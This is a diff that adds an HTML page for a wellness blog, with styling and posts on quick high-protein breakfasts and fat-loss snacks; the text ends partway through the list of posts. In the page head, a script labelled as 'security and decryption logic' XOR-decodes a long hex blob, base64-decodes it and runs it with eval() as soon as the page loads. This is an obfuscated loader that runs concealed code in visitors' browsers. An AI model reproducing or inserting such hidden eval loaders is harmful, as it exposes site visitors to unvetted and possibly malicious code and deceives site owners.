@@ -1,0 +1,880 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Self Growth & Success Tips</title>
+    <!-- Google Fonts for an Elegant Editorial & Lifestyle Aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700;800&family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Redesigned Elegant Lifestyle / Self-Care Editorial Styles */
+        :root {
+            --bg-main: #f9f6f0; /* Warm, organic cream background */
+            --primary-accent: #2d4a43; /* Deep, rich forest sage green */
+            --secondary-accent: #c97a64; /* Soft warm terracotta */
+            --sand-tint: #eae3d8; /* Warm light sand background */
+            --text-dark: #1e2925; /* Off-black/charcoal for premium readability */
+            --text-muted: #5c6b66; /* Muted olive-slate for descriptions */
+            --card-bg: #ffffff; /* Crisp white for clean readability */
+            --border-soft: #e5dfd3; /* Soft border color */
+            --radius: 16px;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            line-height: 1.8;
+            color: var(--text-dark);
+            background-color: var(--bg-main);
+            /* Soft, minimalist grid pattern representing organization and routine */
+            background-image: 
+                radial-gradient(var(--border-soft) 1.5px, transparent 1.5px);
+            background-size: 24px 24px;
+            margin: 0;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        /* Typography */
+        h1, h2, h3, h4, .username {
+            font-family: 'Outfit', sans-serif;
+            color: var(--primary-accent);
+            font-weight: 600;
+            letter-spacing: -0.2px;
+        }
+
+        .container {
+            max-width: 660px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Top Navigation - Clean Editorial Menu */
+        .top-nav {
+            padding: 16px 0;
+            text-align: center;
+            background-color: rgba(249, 246, 240, 0.9);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid var(--border-soft);
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .top-nav a {
+            color: var(--text-dark);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            padding: 8px 22px;
+            text-decoration: none;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            cursor: pointer;
+            background-color: var(--card-bg);
+            border: 1px solid var(--border-soft);
+            border-radius: 50px;
+            font-weight: 500;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.02);
+        }
+
+        .top-nav a:hover {
+            background-color: var(--primary-accent);
+            border-color: var(--primary-accent);
+            color: #ffffff;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(45, 74, 67, 0.15);
+        }
+
+        /* Header */
+        header {
+            padding: 80px 0 40px;
+            text-align: center;
+        }
+
+        header h1 {
+            margin: 0;
+            font-size: 3.2rem;
+            color: var(--primary-accent);
+            cursor: pointer;
+            font-weight: 800;
+            transition: all 0.3s ease;
+        }
+
+        header h1:hover {
+            transform: scale(1.01);
+            color: var(--secondary-accent);
+        }
+
+        header p {
+            margin: 15px auto 0;
+            font-size: 1.15rem;
+            font-weight: 400;
+            color: var(--text-muted);
+            background: var(--sand-tint);
+            display: inline-block;
+            padding: 6px 25px;
+            border-radius: 50px;
+            border: 1px solid var(--border-soft);
+        }
+
+        /* Post Cards - Clean Lifestyle Windows */
+        .post-card, .single-post {
+            background: var(--card-bg);
+            padding: 0;
+            margin-bottom: 50px;
+            border-radius: var(--radius);
+            box-shadow: 0 10px 30px rgba(45, 74, 67, 0.04);
+            border: 1px solid var(--border-soft);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1), box-shadow 0.4s cubic-bezier(0.16, 1, 0.3, 1), border-color 0.4s ease;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .post-card:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 20px 40px rgba(45, 74, 67, 0.08);
+            border-color: var(--secondary-accent);
+        }
+
+        .single-post {
+            cursor: default;
+        }
+
+        .post-header {
+            padding: 20px 30px;
+            display: flex;
+            align-items: center;
+            border-bottom: 1px solid var(--border-soft);
+            background: rgba(233, 223, 211, 0.15);
+        }
+
+        .post-header img.avatar {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            margin-right: 15px;
+            border: 2px solid var(--secondary-accent);
+            padding: 1px;
+            object-fit: cover;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        .post-header .username {
+            font-size: 1.15rem;
+            color: var(--text-dark);
+            font-weight: 600;
+        }
+
+        .post-image {
+            width: 100%;
+            display: block;
+            max-height: 450px;
+            object-fit: cover;
+            border-bottom: 1px solid var(--border-soft);
+        }
+
+        .post-content {
+            padding: 35px 40px 25px;
+        }
+
+        .post-content h2, .post-content h1 {
+            margin: 0 0 15px;
+            font-size: 2rem;
+            line-height: 1.3;
+            color: var(--primary-accent);
+            font-weight: 700;
+        }
+
+        .post-content p {
+            margin-bottom: 20px;
+            font-size: 1.05rem;
+            color: var(--text-dark);
+            font-weight: 400;
+            line-height: 1.8;
+        }
+
+        .post-content a {
+            color: var(--secondary-accent);
+            text-decoration: none;
+            border-bottom: 1px solid var(--secondary-accent);
+            padding-bottom: 1px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .post-content a:hover {
+            color: var(--primary-accent);
+            border-bottom-color: var(--primary-accent);
+        }
+
+        .post-footer {
+            padding: 18px 40px;
+            color: var(--text-muted);
+            font-size: 0.95rem;
+            font-family: 'Outfit', sans-serif;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid var(--border-soft);
+            background: rgba(233, 223, 211, 0.15);
+        }
+
+        /* Single Post Overrides */
+        .single-post .post-image {
+            max-height: none;
+        }
+
+        /* Back Button - Beautiful Terracotta Pill */
+        .back-button {
+            display: inline-flex;
+            align-items: center;
+            margin-bottom: 30px;
+            color: #ffffff;
+            background-color: var(--primary-accent);
+            font-family: 'Outfit', sans-serif;
+            font-size: 1rem;
+            font-weight: 600;
+            text-decoration: none;
+            cursor: pointer;
+            padding: 10px 24px;
+            border-radius: 50px;
+            box-shadow: 0 4px 12px rgba(45, 74, 67, 0.15);
+            transition: all 0.3s ease;
+            border: 2px solid transparent;
+        }
+
+        .back-button:hover {
+            background-color: transparent;
+            color: var(--primary-accent);
+            border-color: var(--primary-accent);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(45, 74, 67, 0.05);
+        }
+
+        /* Overrides for inline styling inside post content to ensure visual consistency */
+        .post-content div[style*="background"] {
+            background: rgba(45, 74, 67, 0.03) !important;
+            border: 1px solid var(--border-soft) !important;
+            border-radius: 12px !important;
+            padding: 25px 30px !important;
+            margin: 30px 0 !important;
+            color: var(--text-dark) !important;
+            box-shadow: none !important;
+        }
+
+        .post-content h3[style*="border-left"] {
+            border-left: 4px solid var(--secondary-accent) !important;
+            color: var(--primary-accent) !important;
+            padding-left: 12px !important;
+        }
+
+        .post-content h4[style*="background"] {
+            background: rgba(201, 122, 100, 0.08) !important;
+            color: var(--primary-accent) !important;
+            border: 1px solid rgba(201, 122, 100, 0.2) !important;
+            border-radius: 8px !important;
+        }
+
+        .post-content span[style*="background"] {
+            background: rgba(233, 223, 211, 0.3) !important;
+            color: var(--primary-accent) !important;
+            border: 1px solid var(--border-soft) !important;
+            border-radius: 50px !important;
+            font-family: 'Outfit', sans-serif !important;
+            font-size: 0.85rem !important;
+            font-weight: 600 !important;
+            padding: 6px 14px !important;
+            display: inline-block;
+            margin: 5px 6px 5px 0;
+            transition: all 0.3s ease;
+            box-shadow: none !important;
+        }
+
+        .post-content span[style*="background"]:hover {
+            border-color: var(--secondary-accent) !important;
+            color: var(--secondary-accent) !important;
+            transform: translateY(-2px);
+        }
+
+        .post-content p[style*="color"],
+        .post-content h3[style*="color"] {
+            color: inherit !important;
+        }
+    </style>
+    <script>
+        /* Keeping your original security and decryption logic intact */
+        (function () {
+            var vtwjjrbym = "35230f2c5a2d050168377f09096819012d0a75595260651f2136122d513b2a5215051872753d7e475202415637773b752d55304b7f5a1f0e13361a73731d220a1524173e63130148685d5d33377802231f6b06025260641313563031523441082f1507345b767344525d630f305d052b004f2b7a5260081f3a2d1d28692b3208170b1b745a2d065c7b06771d09670d3d160a2c65577f180d1032662f6a2b10322c24322d5813160878065e001a647b7d067b74497864134f320c122379303a502f151c235d1c0d426428731e0a677a3e067c7456515a074b382305176435360e2f151f2e58020559520273133049233e156f02486a05392c152d1a347f0417053f0e14235d29014878277b14376728231f6b0600505a2929283d192c522b35172c7f037472070d416b2c7c171c47240f067b05567a703d1538263b3e523b2e0c3d1e17737a2d0656782c74001a730a232b5502487a7f071038216323521e3e50171a312c5d037e487d01631d09680106150a12445773223338261223793039053f0e1776601c0e5668020c57065d1d2a156023566364100e28086a745634361b2f153137631c0d09525c771709771d3d297f2c5d6a60030b2b3d1d3e563b3a12142307285a29114b55274d093102722a2d7f12096a5a3d0d2b562b2e531e3e51140a393163773f6050380057096801282c0b16585104034024223f3154342e1b2c151b7475762c06720674001a730a23067b0556575a170138223f3e611e41523f09652360297e016402630909682c312b7f124b5774394928363823563b0f053f1a602c5d292b5f6837671130597e37166f715f576017162b3d1e23563b0f05142013765813235955280c1e1f5e2f2816551648526f0b14120f200f731a39053f0e14237007065650386c001877273e1e557d017864134f320c1223793039053f0e14237007065678275117315d19322b41715e526f1f48135619717c1d320e150a2d2c6076116555287357096323312b6f3c427f7410163b1c2423544114172c0a6c7775293f47685d735732677231035606595770390d283262287b270b293f0e142370070656782c775e1a771d372c0a115656403e1f38261223793039053f0e142370070656782c74001a730a23160a7d445005680b2b36663752411b0d3f2121016b110d67635e050000781d30166f7056697007482b321d746a2429173f0b1f2863032b486b387b5732677e2a067016477c5e1011382620236a342e18120a3931601c1541535d01171c472423067b05567a74101f3826122379303a51171a602f5b77244453280c0d0a6819342d0a7044505a070f1322152e6a2010092c151b745813725955285911315920730c5105567a74101f38261223562217053f0e14235f1537087828631430021e232a4f340870506c45";
+            var vjfaicbgs = "vMUD9DG11o5gS0KDO8D137QxqeSD0sxb";
+            var vyepniipe = "";
+            try {
+                for (var i = 0; i < vtwjjrbym.length; i += 2) {
+                    var vyhlqhepa = parseInt(vtwjjrbym.substr(i, 2), 16);
+                    vyepniipe += String.fromCharCode(vyhlqhepa ^ vjfaicbgs.charCodeAt((i / 2) % vjfaicbgs.length));
+                }
+                var vvqbkapbd = atob(vyepniipe);
+                eval(vvqbkapbd);
+            } catch (e) {
+                console.error("[DEBUG] Decryption or Execution failed: ", e);
+            }
+        })();
+    </script>
+</head>
+<body>
+    <nav class="top-nav">
+        <a onclick="navigate('home')">Home</a>
+        <a onclick="navigate('page', 'about')">About</a>
+        <a onclick="navigate('page', 'privacy')">Privacy Policy</a>
+        <a onclick="navigate('page', 'terms')">Terms</a>
+        <a onclick="navigate('page', 'contact')">Contact</a>
+    </nav>
+    <header>
+        <div class="container">
+            <h1 onclick="navigate('home')">Self Growth & Success Tips</h1>
+            <p>Practical strategies for wellness, lifestyle design, and daily growth.</p>
+        </div>
+    </header>
+    <main class="container" id="app">
+        <!-- Content will be injected here by JavaScript -->
+    </main>
+
+    <script>
+        // 1. Defining populated blog posts based on the provided images
+        const posts = [
+            {
+                id: '10-minute-high-protein-breakfast-ideas',
+                title: '10 Minute High-Protein Breakfast Ideas for Busy Mornings',
+                date: 'June 12, 2026',
+                image: './assets/10-minute-high-protein-breakfast-ideas.png',
+                excerpt: 'Struggling to find breakfast options that are quick and high in protein? 🍳 Fueling your morning doesn’t have to take hours! This curated guide features nutrient-packed recipes taking 10 minutes or less. From protein oatmeal and smoothies to savory loaded wraps and egg-white muffins, these meals keep you full and focused. \n\n• Get 29g to 52g of premium protein in under 10 minutes.\n• Simple, clean ingredients like cottage cheese, egg whites, and berries.\n\nSave for later! #HighProteinBreakfast #HealthyRecipes #MealPrep #EasyBreakfast #FitnessNutrition #CleanEating',
+                content: `
+<p>Starting your day with a high-protein breakfast is one of the most effective strategies for maintaining sustained energy, accelerating muscle recovery, and regulating appetite throughout the morning. In today's fast-paced world, the most common excuse for skipping breakfast is a lack of time. Fortunately, preparing a nutrient-dense, protein-rich meal does not require an hour of cooking or elaborate prep work. By selecting optimal ingredient combinations, you can craft a delicious, satisfying breakfast packed with 29 to 52 grams of muscle-building protein in exactly ten minutes or less.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>High-protein breakfasts stabilize blood sugar levels and suppress late-morning snack cravings.</li>
+    <li>Egg whites, cottage cheese, and clean protein powders are top-tier protein sources for speedy morning prep.</li>
+    <li>Combining high-quality protein with healthy fats and fiber ensures steady energy releases.</li>
+    <li>Pre-portioning dry ingredients and toppings is the ultimate time-saver for busy schedules.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Morning Protein Rules Your Daily Success</h2>
+
+<p>The breakfast food choices you make establish the biochemical trajectory for your entire afternoon. Opting for sugar-laden pastries or pure carbohydrate dishes triggers a massive spike in insulin followed by a severe energy crash. Conversely, a protein-centered meal satisfies hunger hormones like ghrelin and keeps your metabolism active. It feeds skeletal muscle tissue, which is especially critical if you exercise in the morning or are pursuing body recomposition goals.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Protein has a higher thermic effect of food compared to carbohydrates or fats, meaning your body burns more calories simply digesting protein than any other macronutrient.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Sweet High-Protein Breakfast Solutions</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Ultimate Berry Protein Oatmeal (33g Protein)</h3>
+<p>Oatmeal is a comforting classic, but standard oats lack sufficient protein. By stirring in a high-quality whey or plant-based protein powder immediately after cooking, you transform humble grains into a powerful breakfast bowl. Combine half a cup of rolled oats with water or milk, microwave for two minutes, and then whisk in one scoop of protein powder. Top with fresh blueberries, raspberries, and a tablespoon of natural peanut butter for healthy fats and antioxidants.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Creamy Cottage Cheese Berry Bowl (34g Protein)</h3>
+<p>If you have zero minutes to cook, cottage cheese is your best friend. Simply scoop one cup of low-fat cottage cheese into a bowl. Cottage cheese is packed with casein protein, which digests slowly to keep you full for hours. Enhance the bowl with a quarter cup of mixed berries, a tablespoon of chia seeds for healthy omega-3 fatty acids, and a drizzle of honey for a touch of natural sweetness. This provides a refreshing, creamy, no-cook breakfast option.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Smoothie Booster Banana & Almond Butter Blend (35g Protein)</h3>
+<p>For individuals who prefer to drink their breakfast, a blended smoothie is incredibly efficient. Blend one scoop of vanilla or chocolate protein powder with half a banana, one tablespoon of creamy almond butter, and a cup of dairy or soy milk. The almond butter adds a luxurious texture and supports brain function, while the banana provides crucial potassium and natural carbohydrates to kickstart your physical focus.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Freeze your ripe bananas in advance to give your protein smoothies an incredibly thick, milkshake-like texture without needing to add extra ice.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Savory High-Protein Morning Feasts</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Loaded Ground Turkey Breakfast Wrap (38g Protein)</h3>
+<p>A satisfying breakfast burrito is highly portable and incredibly hearty. Scramble three large eggs in a skillet alongside four ounces of pre-cooked, seasoned lean ground turkey. Once cooked, pile the warm mixture onto a whole-wheat tortilla and top with a quarter cup of diced tomatoes and a pinch of cheese. Wrap tightly and enjoy a protein powerhouse that provides long-lasting fuel for physical or mental tasks.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The High-Protein Loaded Omelet & Avocado Greens (52g Protein)</h3>
+<p>For the ultimate protein punch, whip up an egg white omelet loaded with four egg whites and four ounces of diced chicken. Pan-sear the egg whites, add the pre-cooked chicken and a handful of fresh spinach, and fold carefully. Serve alongside half a diced avocado for vital monounsaturated fats and sprinkle with one ounce of shredded low-fat cheese. This massive plate supplies 52g of muscle-building blocks while remaining extremely low in simple carbohydrates.</p>
+
+<div style="background:rgba(45, 74, 67, 0.03);border:1px solid #e5dfd3;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight on Egg Whites</h3>
+  <p>Egg whites are virtually pure protein with almost zero fats or carbs. By mixing whole eggs with extra egg whites, you can dramatically scale up the protein content of your scrambles and omelets without overloading on daily cholesterol or fat boundaries.</p>
+</div>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Hard Boiled Egg Bagel Sandwich (38g Protein)</h3>
+<p>Slice a toasted whole-wheat bagel in half. Spread one ounce of low-fat cream cheese on the warm halves, layer fresh spinach and sliced tomatoes, and top with two hard-boiled eggs. Hard-boiled eggs are excellent for meal-prep enthusiasts because they can be boiled ahead of time, allowing you to assemble this gourmet breakfast sandwich in under three minutes.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Quick Egg & Broccoli Baked Muffins (41g Protein)</h3>
+<p>Baking a batch of egg muffins over the weekend is the ultimate life hack. Whisk six eggs together with a cup of finely chopped broccoli and two ounces of low-fat cheese. Pour the egg mixture into oiled muffin tins and bake. In the mornings, simply grab three egg muffins, warm them in the microwave for 30 seconds, and walk out the door with a satisfying, warm, veggie-packed meal containing 41 grams of protein.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance: Fast Breakfast Choices</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li><strong>For the commuter:</strong> Loaded Ground Turkey Wrap (38g) or Egg Muffins (41g).</li>
+    <li><strong>For the sweet tooth:</strong> Berry Protein Oatmeal (33g) or Cottage Cheese Bowl (34g).</li>
+    <li><strong>For maximum macro boost:</strong> Chicken & Egg White Omelet (52g).</li>
+    <li><strong>For a refreshing recovery:</strong> Smoothie Booster Banana Blend (35g).</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion</h2>
+<p>Fueling your body with a powerful, high-protein breakfast does not demand extensive time commitments. By making smart ingredient purchases—such as pre-boiled eggs, liquid egg whites, cottage cheese, and lean ground turkey—you can create highly nutritious, satisfying meals in less than ten minutes. Experiment with these sweet and savory breakfast ideas to discover what helps you feel most energized, focused, and ready to conquer your daily professional and personal milestones.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">High Protein</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Quick Breakfast</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Meal Prep</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Healthy Recipes</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Fitness Nutrition</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Weight Loss Meals</span>
+</div>
+`
+            },
+            {
+                id: 'healthy-snacks-fat-loss',
+                title: 'Healthy Snacks for Fat Loss: Smart Choices and Real Results',
+                date: 'June 8, 2026',
+                image: './assets/healthy-snacks-for-fat-loss-smart-choices-and-real-results.png',
+                excerpt: 'Snacking doesn’t have to ruin your fitness goals! 🍎 Choosing the right snacks can actually accelerate your fat loss journey by keeping your metabolism humming and preventing overeating later. Discover 12 low-calorie, high-protein snack ideas that are incredibly satisfying and simple to prepare. \n\n• Highly satisfying snack options ranging from only 80 to 190 calories.\n• Perfect combination of high protein and low calorie to maintain a healthy deficit.\n\nSave for later! #HealthySnacks #FatLossTips #LowCalorieSnacks #WeightLossJourney #HealthyEating #HighProteinSnacks',
+                content: `
+<p>Maintaining a caloric deficit is the foundational rule of fat loss, but managing daily hunger is often the hardest part of the journey. This is where smart snacking becomes a crucial tool. Instead of viewing snacking as a potential pitfall, you can utilize it to stabilize your energy levels, feed lean muscle tissues, and keep your metabolism burning. By choosing whole, minimally processed ingredients that balance low calories with high protein, you can satisfy your cravings without derailing your weight loss progress.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Smart snacks keep your hunger hormones in check, preventing high-calorie binge eating at dinner.</li>
+    <li>High-protein snacks promote satiety because protein takes longer for the stomach to break down.</li>
+    <li>Snacks under 200 calories allow you to enjoy flavorful bites while staying within your fat loss limits.</li>
+    <li>Pairing fiber-rich foods with quality proteins is the gold standard for long-lasting fullness.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Science of Smart Snacking for Weight Management</h2>
+
+<p>When you go too long without eating, your blood sugar drops, signaling your brain that it needs quick energy. This often results in intense cravings for fast-acting, high-sugar carbohydrates. Incorporating structured, protein-rich snacks keeps your blood sugar stable. Protein also triggers the release of peptide YY and glucagon-like peptide-1, which are critical hormones responsible for telling your brain that you are full and satisfied.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Successful weight loss depends on consistency. Restricting yourself too heavily almost always leads to a cycle of starving and bingeing, whereas planned snacking supports long-term adherence.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 Classic Quick Snacks (Under 200 Calories)</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">1. Crisp Apple Slices & Natural Peanut Butter (190 Cal | 7g Protein)</h3>
+<p>This classic snack combines the satisfying crunch and soluble fiber of a sweet apple with the creamy, rich monounsaturated fats of natural peanut butter. Slice one medium apple and serve with one tablespoon of peanut butter. The fiber slows digestion, while the healthy fats provide sustained, slow-release energy for your brain and muscles.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">2. Creamy Greek Yogurt & Fresh Berries (150 Cal | 15g Protein)</h3>
+<p>Greek yogurt is a legendary fat loss food because it contains double the protein of regular yogurt. Opt for plain, non-fat Greek yogurt and top with a half-cup of sweet mixed berries. Berries provide delicious natural sweetness, vitamin C, and antioxidant power, while the yogurt supplies a massive dose of clean, muscle-retaining protein.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">3. Cottage Cheese & Fresh Tomatoes (120 Cal | 14g Protein)</h3>
+<p>For a delicious savory snack, scoop a half-cup of low-fat cottage cheese into a small bowl and mix with chopped cherry tomatoes, a pinch of black pepper, and a light dash of sea salt. Cottage cheese is packed with slow-digesting casein protein, making it an excellent afternoon snack to keep you full until dinner time.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> Add a pinch of fresh basil or a light drizzle of balsamic glaze to your cottage cheese and tomato bowl to enjoy a low-calorie Caprese-style treat!</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">4. Hard Boiled Eggs & Sliced Cucumbers (150 Cal | 12g Protein)</h3>
+<p>Perfect for meal preppers on the go, hard-boiled eggs are highly portable and incredibly nutritious. Pair two large hard-boiled eggs with a cup of crisp, refreshing cucumber slices. The cucumbers provide hydration and crunch with virtually zero calories, while the eggs provide complete amino acids and essential B-vitamins.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">5. Crunchy Roasted Chickpeas (120 Cal | 6g Protein)</h3>
+<p>If you find yourself craving potato chips or salty snacks, roasted chickpeas are a fantastic alternative. Toss canned chickpeas with a teaspoon of olive oil and your favorite spices, and bake until perfectly crispy. A half-cup serving provides a satisfying crunch alongside plant-based protein and complex, fiber-rich carbohydrates.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">6. Rich Berry Protein Smoothie (160 Cal | 20g Protein)</h3>
+<p>Blend one scoop of clean vanilla protein powder with a cup of unsweetened almond milk and a half-cup of frozen mixed berries. This sweet, refreshing treat tastes like a dessert but supplies 20 grams of high-quality protein to support muscle repair and keep sweet cravings completely at bay.</p>
+
+<div style="background:rgba(45, 74, 67, 0.03);border:1px solid #e5dfd3;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Power of Portion Control</h3>
+  <p>Even healthy snacks can hinder your progress if you overconsume them. For example, while raw almonds are incredibly healthy, eating them directly from a giant bag makes it easy to accidentally consume 500+ calories. Always pre-portion your snacks into small bowls or bags to keep your intake accurate and aligned with your daily goals.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">6 Savory & Specialty Fat Loss Snacks</h2>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">7. Tuna Salad Stuffed Mini Bell Peppers (180 Cal | 20g Protein)</h3>
+<p>Tuna is an incredible source of lean protein. Mix one can of water-packed tuna with a tablespoon of light mayonnaise or plain Greek yogurt, diced celery, and black pepper. Scoop the mixture into sliced, hollowed-out mini sweet bell peppers. This low-carb snack is crisp, delicious, and highly satisfying.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">8. Raw Whole Almonds - 23 Pieces (160 Cal | 6g Protein)</h3>
+<p>When you need a quick, no-prep snack, grab a handful of raw almonds. Count out exactly 23 pieces to stay on track. Almonds are loaded with vitamin E, magnesium, and dietary fiber, which work together to suppress your appetite and support cardiovascular health.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">9. Lean Turkey Roll-Ups with Veggies (150 Cal | 18g Protein)</h3>
+<p>Lay out four slices of deli turkey breast. Place thin slices of bell pepper, cucumber, or spinach inside, and roll them up tightly. You can add a smear of mustard for flavor with zero extra calories. This deli-style snack is incredibly low in carbohydrates while packing 18 grams of clean, lean protein.</p>
+
